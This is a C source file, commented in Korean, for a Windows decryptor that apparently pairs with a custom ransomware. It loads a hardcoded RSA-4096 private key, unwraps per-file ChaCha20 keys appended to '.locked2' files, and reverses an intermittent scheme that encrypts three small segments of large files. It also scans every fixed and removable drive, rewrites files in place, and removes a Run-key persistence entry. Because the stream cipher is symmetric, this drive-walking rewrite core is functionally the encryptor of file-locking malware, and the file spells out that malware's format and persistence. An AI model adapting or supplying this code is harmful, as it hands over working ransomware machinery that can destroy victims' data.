// 파일명: sized_decrypt_engine3_hybrid.c
// 설명: 패스프레이즈 "test2" 기반 RSA-4096 전수 모듈러스 패치, 가변 오프셋 ChaCha20 스트림 복호화 및 레지스트리 상주 흔적 제거 엔진
// 컴파일 명령: gcc sized_decrypt_engine3_hybrid.c -o decryptor.exe -lbcrypt

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <locale.h>
#include <io.h>     
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

#define ONE_MEGABYTE (1024 * 1024)
#define TARGET_EXTENSION L".locked2"
#define REG_REGISTRY_SUBKEY L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_AUTO_START_NAME L"SizedCryptoEngineAnalyzer"

BCRYPT_KEY_HANDLE g_hRsaPrivKey = NULL; 

// ---------------------------------------------------------------------
// SECTION 1: RFC 7539 호환 ChaCha20 스트림 알고리즘 코어 엔진 (대칭 역연산)
// ---------------------------------------------------------------------

#define ROTL(v, n) (((v) << (n)) | ((v) >> (32 - (n))))

#define CHACHA20_QUARTERROUND(a, b, c, d) \
    a += b; d ^= a; d = ROTL(d, 16); \
    c += d; b ^= c; b = ROTL(b, 12); \
    a += b; d ^= a; d = ROTL(d,  8); \
    c += d; b ^= c; b = ROTL(b,  7);

static void ChaCha20InitState(uint32_t state[16], const uint8_t key[32], const uint8_t nonce[12], uint32_t counter) {
    state[0] = 0x61707865; 
    state[1] = 0x3320646e;
    state[2] = 0x79622d32;
    state[3] = 0x6b206574;
    
    memcpy(&state[4], key, 32);
    state[12] = counter;   
    memcpy(&state[13], nonce, 12);
}

static void ChaCha20TransformBlock(uint32_t out[16], const uint32_t in[16]) {
    int i;
    for (i = 0; i < 16; i++) out[i] = in[i];
    for (i = 0; i < 10; i++) {
        CHACHA20_QUARTERROUND(out[0], out[4], out[ 8], out[12])
        CHACHA20_QUARTERROUND(out[1], out[5], out[ 9], out[13])
        CHACHA20_QUARTERROUND(out[2], out[6], out[10], out[14])
        CHACHA20_QUARTERROUND(out[3], out[7], out[11], out[15])
        CHACHA20_QUARTERROUND(out[0], out[5], out[10], out[15])
        CHACHA20_QUARTERROUND(out[1], out[6], out[11], out[12])
        CHACHA20_QUARTERROUND(out[2], out[7], out[ 8], out[13])
        CHACHA20_QUARTERROUND(out[3], out[4], out[ 9], out[14])
    }
    for (i = 0; i < 16; i++) out[i] += in[i];
}

void ChaCha20CryptProcess(const uint8_t key[32], const uint8_t nonce[12], uint64_t fileByteOffset, uint8_t* pData, size_t dataLen) {
    uint32_t state[16];
    uint32_t block[16];
    uint8_t keystream[64];
    
    uint64_t currentOffset = fileByteOffset;
    size_t processedIdx = 0;
    
    while (dataLen > 0) {
        uint32_t blockCounter = (uint32_t)(currentOffset / 64);
        size_t internalStreamIdx = (size_t)(currentOffset % 64);
        
        ChaCha20InitState(state, key, nonce, blockCounter);
        ChaCha20TransformBlock(block, state);
        
        for (int i = 0; i < 16; i++) {
            keystream[i * 4 + 0] = (uint8_t)(block[i] & 0xFF);
            keystream[i * 4 + 1] = (uint8_t)((block[i] >> 8) & 0xFF);
            keystream[i * 4 + 2] = (uint8_t)((block[i] >> 16) & 0xFF);
            keystream[i * 4 + 3] = (uint8_t)((block[i] >> 24) & 0xFF);
        }
        
        size_t availableStreamBytes = 64 - internalStreamIdx;
        size_t transformChunkSize = (dataLen < availableStreamBytes) ? dataLen : availableStreamBytes;
        
        for (size_t i = 0; i < transformChunkSize; i++) {
            pData[processedIdx++] ^= keystream[internalStreamIdx + i];
        }
        
        currentOffset += transformChunkSize;
        dataLen -= transformChunkSize;
    }
}

// ---------------------------------------------------------------------
// SECTION 2: Windows CNG API 기반 RSA-4096 개인키(Private Key) 임포트 엔진
// ---------------------------------------------------------------------

BOOL InitRsaPrivateKey(void) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (status != 0) return FALSE;

    static const uint8_t rsa_exponent[] = { 0x01, 0x00, 0x01 };
    
    static const uint8_t rsa_modulus[512] = {
        0x98, 0x5C, 0xD5, 0x0E, 0xEC, 0x71, 0x05, 0x1D, 0x83, 0xE8, 0xF4, 0xAC, 0x1A, 0x27, 0x2B, 0xDF,
        0x7C, 0x58, 0xFE, 0xB5, 0x4C, 0xE5, 0x2B, 0x5E, 0x6B, 0x24, 0xC6, 0xE7, 0xAC, 0x78, 0x6B, 0x5B,
        0x6B, 0xBD, 0x2D, 0x49, 0x96, 0xDC, 0x2A, 0x15, 0x95, 0x74, 0x3F, 0x47, 0xD8, 0x3C, 0x3D, 0x4C,
        0xE0, 0x84, 0x0E, 0x1B, 0x9C, 0x54, 0xC0, 0x49, 0x25, 0x00, 0xA0, 0xA5, 0x0A, 0x88, 0x53, 0xA1,
        0x65, 0x62, 0xCC, 0x17, 0xE1, 0x7E, 0x7C, 0x97, 0xBD, 0x6C, 0xD3, 0x8B, 0xE1, 0x73, 0x3C, 0x69,
        0x7E, 0xA9, 0xB0, 0x11, 0x9A, 0x10, 0x31, 0x93, 0x69, 0xA5, 0x4B, 0x50, 0x70, 0x98, 0xA4, 0x34,
        0x0C, 0x04, 0x8A, 0xE7, 0xC5, 0xE8, 0x92, 0x02, 0x05, 0xD9, 0xD6, 0xB8, 0x0C, 0xEE, 0x3F, 0x68,
        0xDC, 0x69, 0xAA, 0xA0, 0x0C, 0x02, 0x2B, 0x37, 0xD8, 0x8C, 0xF4, 0x8A, 0x06, 0x6E, 0xDA, 0xB9,
        0x92, 0xF8, 0x81, 0xAD, 0x43, 0x1D, 0xBD, 0x0B, 0x95, 0x52, 0xC7, 0x2B, 0xA2, 0xCB, 0x4E, 0xFA,
        0xF5, 0x9A, 0xE3, 0xD6, 0xAB, 0xB6, 0x9C, 0x09, 0x4C, 0x73, 0xD2, 0x27, 0xBB, 0xD7, 0x32, 0xF6,
        0xE8, 0x6B, 0xD0, 0x04, 0x58, 0xED, 0x8A, 0xF9, 0x60, 0x3B, 0xFC, 0x9D, 0x14, 0x40, 0xDA, 0xA7,
        0x84, 0xF7, 0x37, 0x1F, 0xF1, 0x43, 0x72, 0xF6, 0x41, 0x28, 0xA6, 0xF7, 0x80, 0x6A, 0x55, 0xDB,
        0x26, 0x92, 0x81, 0x24, 0x2B, 0xC1, 0xF9, 0x1C, 0xD6, 0x27, 0xBC, 0x38, 0xAC, 0xAA, 0xFD, 0xAC,
        0x48, 0x9A, 0xEC, 0xA8, 0xAF, 0xC9, 0xF9, 0xD9, 0x28, 0xB9, 0x15, 0x86, 0x2E, 0x93, 0x78, 0x23,
        0x48, 0xB7, 0x43, 0x9F, 0x5C, 0x4A, 0x37, 0xF2, 0xEC, 0xFE, 0x56, 0x4A, 0xC7, 0x01, 0x8B, 0x07,
        0x8C, 0xDE, 0xD2, 0xAE, 0x08, 0xC6, 0x34, 0x51, 0x1D, 0x81, 0x64, 0xE3, 0x02, 0x9B, 0xAC, 0x23,
        0x47, 0x1E, 0x45, 0x18, 0x8C, 0x6A, 0x84, 0x9E, 0x23, 0xD0, 0x47, 0x96, 0x44, 0x3B, 0x54, 0xFB,
        0x77, 0x06, 0x82, 0x96, 0x7E, 0xAD, 0x63, 0x7E, 0x8E, 0xBB, 0x65, 0xB0, 0x98, 0x8E, 0xC7, 0x0E,
        0x42, 0x2A, 0xD3, 0xA8, 0x36, 0xE1, 0x60, 0x6A, 0xCE, 0xBE, 0xD3, 0x30, 0x3D, 0x39, 0x76, 0xB0,
        0x42, 0x08, 0x84, 0x0E, 0xB9, 0xE3, 0xBE, 0xB8, 0xF9, 0xA6, 0x77, 0xE5, 0xF3, 0x08, 0xF1, 0xBF,
        0xF0, 0xBB, 0x68, 0x16, 0x00, 0xCA, 0x06, 0xCC, 0x1D, 0x6D, 0x5D, 0x97, 0x6F, 0x63, 0x6F, 0xF8,
        0xDF, 0x48, 0x13, 0xB2, 0xB2, 0x51, 0x56, 0xD2, 0xD7, 0xE6, 0xD5, 0x15, 0xE3, 0x04, 0x57, 0x75,
        0x57, 0x65, 0x15, 0x5E, 0xC4, 0xD6, 0x1F, 0xDC, 0x71, 0xA5, 0x6B, 0x28, 0x3C, 0x46, 0x00, 0x63,
        0xB7, 0xEB, 0x0A, 0x6B, 0xDA, 0x48, 0xD3, 0x53, 0x33, 0xE8, 0x78, 0xBF, 0x1A, 0x94, 0x85, 0x9E,
        0xD1, 0xD3, 0x23, 0x21, 0x1B, 0xBB, 0xAC, 0x1D, 0xEC, 0x71, 0xB1, 0x93, 0x3A, 0x91, 0x1C, 0x33,
        0x38, 0x91, 0xD4, 0xBB, 0x68, 0x42, 0x7F, 0x2A, 0x82, 0x37, 0x26, 0x6A, 0xA7, 0xA8, 0xE0, 0xB9,
        0x42, 0xC0, 0xC0, 0x73, 0x85, 0x6F, 0x73, 0xA1, 0xBF, 0xD1, 0x88, 0xD3, 0x04, 0x36, 0x30, 0x29,
        0x0F, 0x63, 0xBE, 0x6D, 0x1B, 0xBA, 0x68, 0x87, 0x82, 0x31, 0xCE, 0xBC, 0xA8, 0x51, 0x23, 0x92,
        0xD9, 0xA9, 0xE7, 0x5A, 0x0D, 0x31, 0xDF, 0x44, 0x82, 0x53, 0xA3, 0x6A, 0xE3, 0xE6, 0x1A, 0x39,
        0x03, 0x24, 0xAB, 0x23, 0x25, 0x71, 0x21, 0x76, 0xAB, 0x98, 0x9B, 0xB6, 0xC1, 0xBF, 0x4E, 0xA0,
        0xED, 0xF3, 0x7D, 0x4C, 0xE0, 0x17, 0x14, 0x4D, 0x98, 0x25, 0x69, 0x95, 0x26, 0x27, 0x07, 0x14,
        0x2F, 0xF6, 0xC4, 0x18, 0x6B, 0x5B, 0x4B, 0x04, 0x45, 0xDA, 0x25, 0xB8, 0xF4, 0x9A, 0xF9, 0x33
    };
    
    static const uint8_t rsa_prime1[256] = {
        0xCB, 0xC9, 0x46, 0x26, 0x63, 0xA8, 0x08, 0x09, 0x84, 0xC4, 0x4D, 0x6F, 0x8E, 0xBF, 0x46, 0xD2,
        0x9D, 0xC0, 0x53, 0x65, 0xAD, 0xBB, 0x6E, 0x2D, 0x4A, 0x10, 0xD7, 0xCD, 0x7B, 0xB0, 0x8C, 0x39,
        0x84, 0x0C, 0xC8, 0x9A, 0x89, 0xA0, 0x2F, 0x1D, 0xC4, 0x41, 0xA7, 0xF8, 0x15, 0x26, 0x8E, 0xEC,
        0x4A, 0xFF, 0x50, 0x0B, 0x07, 0x30, 0x08, 0x62, 0xA1, 0x5A, 0xAF, 0x70, 0xCB, 0xD6, 0x99, 0x2D,
        0x71, 0xD5, 0x3F, 0xE6, 0xF2, 0x80, 0x68, 0x1B, 0x16, 0x75, 0x05, 0xC4, 0x07, 0x9D, 0x44, 0xE4,
        0x18, 0xD4, 0xC2, 0x50, 0x42, 0x6D, 0x3F, 0x2A, 0xE3, 0x23, 0x65, 0xB6, 0x6D, 0xA3, 0x24, 0x31,
        0x7E, 0xB9, 0x75, 0xCA, 0xAF, 0xAF, 0x38, 0x99, 0x55, 0xE7, 0xDC, 0xED, 0xB9, 0x90, 0x88, 0x64,
        0xC1, 0xBD, 0x03, 0xB5, 0x82, 0x4C, 0x03, 0xA8, 0x8A, 0x87, 0x6B, 0xA2, 0x28, 0x3A, 0xB5, 0xD6,
        0x79, 0x53, 0xFE, 0x08, 0x62, 0x60, 0x8B, 0xA1, 0x9A, 0x57, 0xFD, 0x53, 0xC8, 0x71, 0xFD, 0x99,
        0x0E, 0x06, 0x44, 0x31, 0x7F, 0x26, 0xA9, 0x01, 0x44, 0x7E, 0x0F, 0xFB, 0x7A, 0x03, 0x6F, 0x8C,
        0xF9, 0x79, 0xCE, 0x71, 0x2D, 0x92, 0x60, 0x76, 0xC8, 0x16, 0xE4, 0x63, 0xD1, 0x54, 0x0D, 0x53,
        0x11, 0x80, 0x46, 0x6F, 0xB1, 0xCA, 0x59, 0xFE, 0xF5, 0x60, 0xCE, 0xFA, 0x39, 0x25, 0xBF, 0xE2,
        0xC8, 0x60, 0xA2, 0x43, 0x5A, 0x2F, 0x69, 0x4D, 0xA0, 0x41, 0xFE, 0xE4, 0x07, 0x9E, 0x0F, 0x62,
        0xB2, 0x62, 0x8E, 0xAD, 0xE6, 0xFD, 0xC6, 0x14, 0x54, 0xC5, 0xEF, 0xAA, 0xDE, 0xCC, 0x8C, 0xF6,
        0xBC, 0xD6, 0x6D, 0x9E, 0xC1, 0x99, 0x87, 0xED, 0xD5, 0xD7, 0xCB, 0x9D, 0xDC, 0x3A, 0x5E, 0xFF,
        0xFD, 0xCB, 0xDB, 0xC6, 0x73, 0x8A, 0x67, 0x87, 0xD2, 0x13, 0xCB, 0x99, 0xA8, 0xFC, 0x86, 0x5D
    };
    
    static const uint8_t rsa_prime2[256] = {
        0xBF, 0x66, 0x96, 0x26, 0x2F, 0x80, 0x3E, 0x42, 0xB2, 0x6E, 0x51, 0x44, 0x9B, 0x92, 0x81, 0x37,
        0xE9, 0xC4, 0x75, 0x44, 0x9A, 0xC2, 0x99, 0x77, 0xDB, 0x00, 0x4A, 0x01, 0x9C, 0x7B, 0xDB, 0x41,
        0xC2, 0xA7, 0x1B, 0xF1, 0xEF, 0x58, 0x88, 0xEA, 0xCA, 0x26, 0x67, 0x5B, 0x76, 0xD6, 0x10, 0x36,
        0x7A, 0xD1, 0xEE, 0x3D, 0xA6, 0xAF, 0x51, 0x50, 0xD2, 0x8F, 0xC8, 0x5A, 0xD4, 0xC0, 0x33, 0x5B,
        0xD2, 0x50, 0x6B, 0x7B, 0x1E, 0x55, 0xAA, 0xA8, 0x3C, 0x59, 0xDE, 0xAE, 0x68, 0xAB, 0x08, 0xAA,
        0x6A, 0xAC, 0xED, 0x22, 0xF9, 0x7D, 0xBA, 0x11, 0xE9, 0x39, 0xAB, 0xF9, 0x4C, 0x77, 0xC6, 0xA1,
        0x29, 0xFF, 0x05, 0x52, 0x34, 0x26, 0x86, 0x97, 0x3B, 0x10, 0x96, 0x9A, 0xBB, 0xF7, 0x4A, 0xAE,
        0x42, 0xEC, 0xF2, 0x49, 0x36, 0x6E, 0x5B, 0x7C, 0x78, 0x2E, 0x91, 0x9E, 0x13, 0x99, 0xBD, 0x5C,
        0x23, 0x87, 0xB8, 0xEA, 0xDE, 0x25, 0x05, 0xAF, 0x0A, 0xA4, 0x48, 0xC0, 0xDD, 0x1A, 0x94, 0x14,
        0x73, 0x9B, 0x48, 0xA7, 0x9C, 0x53, 0xC0, 0xC1, 0x07, 0x27, 0x33, 0x8F, 0x6A, 0x54, 0xCB, 0x2E,
        0x5C, 0x26, 0xBD, 0x65, 0xDC, 0xB6, 0xB8, 0xBF, 0x36, 0xDF, 0xB6, 0x7B, 0x5B, 0xE5, 0x0F, 0xA6,
        0x30, 0x04, 0xCB, 0xA4, 0x0F, 0x13, 0xD0, 0xE9, 0x53, 0x94, 0x2C, 0x04, 0x4C, 0x1D, 0x61, 0x79,
        0xF3, 0x0D, 0x9D, 0x70, 0x40, 0xA9, 0x40, 0xB6, 0xCB, 0xD3, 0x32, 0xDD, 0xA0, 0x51, 0xA8, 0xB0,
        0x12, 0xF0, 0xEC, 0xBC, 0x40, 0x29, 0x09, 0x44, 0xC0, 0x09, 0x2C, 0x17, 0x33, 0x45, 0x78, 0x25,
        0x44, 0x79, 0x2A, 0x0D, 0xBF, 0xE9, 0xF8, 0xBC, 0x85, 0x61, 0x7F, 0x5F, 0xD7, 0xF1, 0x64, 0x75,
        0xBA, 0x4C, 0x5A, 0x59, 0x6D, 0xF1, 0xFD, 0x1D, 0xB3, 0x79, 0x57, 0xD5, 0xC0, 0xC6, 0x64, 0xCF
    };

    DWORD dwBlobLen = sizeof(BCRYPT_RSAKEY_BLOB) + sizeof(rsa_exponent) + sizeof(rsa_modulus) + sizeof(rsa_prime1) + sizeof(rsa_prime2);
    BYTE* pBlob = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBlobLen);
    if (!pBlob) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }

    BCRYPT_RSAKEY_BLOB* pHeader = (BCRYPT_RSAKEY_BLOB*)pBlob;
    pHeader->Magic = BCRYPT_RSAPRIVATE_MAGIC; 
    pHeader->BitLength = 4096;
    pHeader->cbPublicExp = sizeof(rsa_exponent);
    pHeader->cbModulus = sizeof(rsa_modulus);
    pHeader->cbPrime1 = sizeof(rsa_prime1);
    pHeader->cbPrime2 = sizeof(rsa_prime2);
    
    size_t offset = sizeof(BCRYPT_RSAKEY_BLOB);
    memcpy(pBlob + offset, rsa_exponent, sizeof(rsa_exponent)); offset += sizeof(rsa_exponent);
    memcpy(pBlob + offset, rsa_modulus, sizeof(rsa_modulus));   offset += sizeof(rsa_modulus);
    memcpy(pBlob + offset, rsa_prime1, sizeof(rsa_prime1));     offset += sizeof(rsa_prime1);
    memcpy(pBlob + offset, rsa_prime2, sizeof(rsa_prime2));

    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPRIVATE_BLOB, &g_hRsaPrivKey, pBlob, dwBlobLen, 0);
    HeapFree(GetProcessHeap(), 0, pBlob);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return (status == 0);
}

// ---------------------------------------------------------------------
// SECTION 3: 레지스트리 자동 실행(Persistence) 흔적 삭제 모듈 (신규 추가)
// ---------------------------------------------------------------------

BOOL RemoveAutoStartPersistence(void) {
    HKEY hKey = NULL;
    // KEY_SET_VALUE 권한으로 레지스트리 런 키 오픈
    LONG lResult = RegOpenKeyExW(HKEY_CURRENT_USER, REG_REGISTRY_SUBKEY, 0, KEY_SET_VALUE, &hKey);
    if (lResult != ERROR_SUCCESS) {
        wprintf(L"[-] Failed to open Run registry key for cleanup. Error code: %ld\n", lResult);
        return FALSE;
    }

    // 타깃 값 삭제 수행
    lResult = RegDeleteValueW(hKey, REG_AUTO_START_NAME);
    RegCloseKey(hKey);

    if (lResult != ERROR_SUCCESS) {
        if (lResult == ERROR_FILE_NOT_FOUND) {
            wprintf(L"[*] Registry entry '%s' was not found (Already clean).\n", REG_AUTO_START_NAME);
            return TRUE;
        }
        wprintf(L"[-] Failed to delete persistence registry value. Error code: %ld\n", lResult);
        return FALSE;
    }

    wprintf(L"[+] Successfully removed persistence registry value: %s\n", REG_AUTO_START_NAME);
    return TRUE;
}

// ---------------------------------------------------------------------
// SECTION 4: 복호화 대상 선별 및 가변 오프셋 파일 복구 파이프라인
// ---------------------------------------------------------------------

BOOL IsEncryptedExtension(const wchar_t* lpFullPath) {
    size_t len = wcslen(lpFullPath);
    size_t extLen = wcslen(TARGET_EXTENSION);
    if (len > extLen) {
        if (_wcsicmp(lpFullPath + (len - extLen), TARGET_EXTENSION) == 0) {
            return TRUE; 
        }
    }
    return FALSE;
}

void DecryptFileContentSized(const wchar_t* lpFilePath) {
    if (!IsEncryptedExtension(lpFilePath)) return;

    FILE* hFile = NULL;
    if (_wfopen_s(&hFile, lpFilePath, L"rb+") != 0 || hFile == NULL) return;

    _fseeki64(hFile, 0, SEEK_END);
    long long totalFileSize = _ftelli64(hFile);
    
    if (totalFileSize <= 512) {
        fclose(hFile);
        return;
    }

    long long originalFileSize = totalFileSize - 512;

    uint8_t rsa_encrypted_header[512];
    _fseeki64(hFile, originalFileSize, SEEK_SET);
    if (fread(rsa_encrypted_header, 1, 512, hFile) != 512) {
        fclose(hFile);
        return;
    }

    uint8_t plainPacket[44];
    DWORD cbResult = 0;
    NTSTATUS status = BCryptDecrypt(g_hRsaPrivKey, rsa_encrypted_header, 512, NULL, NULL, 0, 
                                    plainPacket, sizeof(plainPacket), &cbResult, BCRYPT_PAD_PKCS1);
    if (status != 0) {
        wprintf(L"[-] RSA decryption failure for asset: %s\n", lpFilePath);
        fclose(hFile);
        return;
    }

    uint8_t file_session_key[32];
    uint8_t file_session_nonce[12];
    memcpy(file_session_key, plainPacket, 32);
    memcpy(file_session_nonce, plainPacket + 32, 12);

    unsigned char buffer[4096];
    size_t bytesRead;

    if (originalFileSize < ONE_MEGABYTE) {
        _fseeki64(hFile, 0, SEEK_SET);
        long long currentFilePos = 0;
        
        while (currentFilePos < originalFileSize) {
            size_t toRead = sizeof(buffer);
            if (originalFileSize - currentFilePos < (long long)toRead) {
                toRead = (size_t)(originalFileSize - currentFilePos);
            }
            
            bytesRead = fread(buffer, 1, toRead, hFile);
            if (bytesRead <= 0) break;

            ChaCha20CryptProcess(file_session_key, file_session_nonce, (uint64_t)currentFilePos, buffer, bytesRead);
            
            _fseeki64(hFile, -(long long)bytesRead, SEEK_CUR);
            fwrite(buffer, 1, bytesRead, hFile);
            fflush(hFile);
            
            currentFilePos += bytesRead;
        }
    } else {
        long long segmentSize = originalFileSize / 3;
        long long targetEncSize = segmentSize / 100;
        if (targetEncSize <= 0) targetEncSize = 1;

        long long chunkOffsets[3];
        chunkOffsets[0] = 0;
        chunkOffsets[1] = segmentSize;
        chunkOffsets[2] = segmentSize * 2;

        for (int i = 0; i < 3; i++) {
            _fseeki64(hFile, chunkOffsets[i], SEEK_SET);
            long long accumulated = 0;
            long long currentFilePos = chunkOffsets[i];

            while (accumulated < targetEncSize) {
                size_t toRead = sizeof(buffer);
                if (targetEncSize - accumulated < (long long)toRead) {
                    toRead = (size_t)(targetEncSize - accumulated);
                }

                bytesRead = fread(buffer, 1, toRead, hFile);
                if (bytesRead <= 0) break;

                ChaCha20CryptProcess(file_session_key, file_session_nonce, (uint64_t)currentFilePos, buffer, bytesRead);
                
                _fseeki64(hFile, -(long long)bytesRead, SEEK_CUR);
                fwrite(buffer, 1, bytesRead, hFile);
                fflush(hFile);

                accumulated += bytesRead;
                currentFilePos += bytesRead;
            }
        }
    }

    int fd = _fileno(hFile);
    _chsize_s(fd, originalFileSize); 
    fclose(hFile);

    wchar_t szOriginalPath[MAX_PATH] = { 0 };
    size_t lenPath = wcslen(lpFilePath);
    size_t lenExt = wcslen(TARGET_EXTENSION);
    memcpy(szOriginalPath, lpFilePath, (lenPath - lenExt) * sizeof(wchar_t));

    if (MoveFileExW(lpFilePath, szOriginalPath, MOVEFILE_REPLACE_EXISTING)) {
        wprintf(L"[+] Decrypted & Restored: %s -> %s\n", lpFilePath, szOriginalPath);
    } else {
        wprintf(L"[-] Failed to restore file handle string for: %s\n", lpFilePath);
    }
}

// ---------------------------------------------------------------------
// SECTION 5: 디렉터리 재귀 탐색 및 드라이브 스캔 파이프라인
// ---------------------------------------------------------------------

void TraverseDirectoryRecursive(const wchar_t* lpDirPATH) {
    wchar_t szSearchPath[MAX_PATH];
    wchar_t szSubPath[MAX_PATH];
    WIN32_FIND_DATAW findData;
    HANDLE hFind = INVALID_HANDLE_VALUE;

    swprintf_s(szSearchPath, MAX_PATH, L"%s\\*", lpDirPATH);

    hFind = FindFirstFileW(szSearchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) {
            continue;
        }
        swprintf_s(szSubPath, MAX_PATH, L"%s\\%s", lpDirPATH, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            TraverseDirectoryRecursive(szSubPath);
        } else {
            DecryptFileContentSized(szSubPath);
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
}

void EnumerateAllLogicalDrives(void) {
    wchar_t szBuffer[256] = { 0 };
    DWORD dwResult = GetLogicalDriveStringsW(sizeof(szBuffer) / sizeof(wchar_t), szBuffer);
    if (dwResult == 0 || dwResult > sizeof(szBuffer) / sizeof(wchar_t)) return;

    wchar_t* pDrive = szBuffer;
    while (*pDrive) {
        UINT uDriveType = GetDriveTypeW(pDrive);
        if (uDriveType == DRIVE_FIXED || uDriveType == DRIVE_REMOVABLE) {
            size_t len = wcslen(pDrive);
            if (len > 0 && pDrive[len - 1] == L'\\') pDrive[len - 1] = L'\0';
            
            wprintf(L"[*] Scanning encrypted assets on drive: %s\n", pDrive);
            TraverseDirectoryRecursive(pDrive);
            pDrive[len - 1] = L'\\';
        }
        pDrive += wcslen(pDrive) + 1;
    }
}

// ---------------------------------------------------------------------
// MAIN ENTRY POINT
// ---------------------------------------------------------------------

int main(void) {
    setlocale(LC_ALL, ""); 

    wprintf(L"[*] Executing registry persistence cleanup sequence...\n");
    RemoveAutoStartPersistence(); // 메인 입출력 기동 전 레지스트리 변조 흔적 선제 소거

    wprintf(L"[*] Initializing CNG Cryptographic Provider and RSA Private Key Core...\n");
    if (!InitRsaPrivateKey()) {
        wprintf(L"[-] Failed to load RSA Private Key Configuration. Terminating process.\n");
        return 1;
    }

    wprintf(L"[*] Initiating systemic hybrid total recovery operations...\n");
    EnumerateAllLogicalDrives();

    if (g_hRsaPrivKey) {
        BCryptDestroyKey(g_hRsaPrivKey);
    }

    wprintf(L"[+] Decryption and system remediation task sequence has been fully executed.\n");
    return 0;
}